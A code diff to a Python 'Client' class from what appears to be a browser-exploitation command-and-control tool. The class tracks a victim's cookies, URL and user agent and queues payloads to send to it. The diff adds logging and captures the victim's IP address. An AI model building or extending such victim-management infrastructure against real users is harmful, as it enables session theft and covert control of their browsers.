@@ -2,6 +2,7 @@ import json
 from queue import Queue
 import time
 import threading 
+from .Logger import Logger
 import  _thread
 
 class Client:
@@ -16,16 +17,19 @@ class Client:
         self.useragent=clientinfo['useragent']
         self.curdomaincookies=clientinfo['curdomaincookies']
         self.cururl=clientinfo['cururl']
+        self.ip=clientinfo['clientipaddress']
         self.taskqueue=Queue()
         self.stopattack=False
         self.taskresult={}
         self.tasksemaphore={}
+        self.logger=Logger(f'client {self.clientid}')
 
     def pop_latest_task(self):
         '''
         Pops the latest task from task queue of this victim
         If there are no tasks, it returns None
         '''
+        self.logger.debug('client is fetching task')
         try:
             return self.taskqueue.get(False)
         except:
@@ -36,6 +40,7 @@ class Client:
         Stops attacks on this client immediately
         This function clears task queue and set stopattack=True to prevent further attacks
         '''
+        self.logger.debug('stop attack on client')
         self.stopattack=True
         self.taskqueue=Queue()
 
@@ -47,6 +52,7 @@ class Client:
         If an callback parameter is a callable function was passed in, it starts a new thread to pass result of execution and pass it to callback function and returns taskid
         If the callback parameter is not callable, it simply send the payload to the client and return the taskid (so that when you want to send a payload asynchronously, you don't have to create a useless function to be passed in)
         '''
+        self.logger.debug(f'sending payload')
         if self.stopattack:
             raise Exception("Attack on this client should be stopped")
         payload=moduleobj.payload
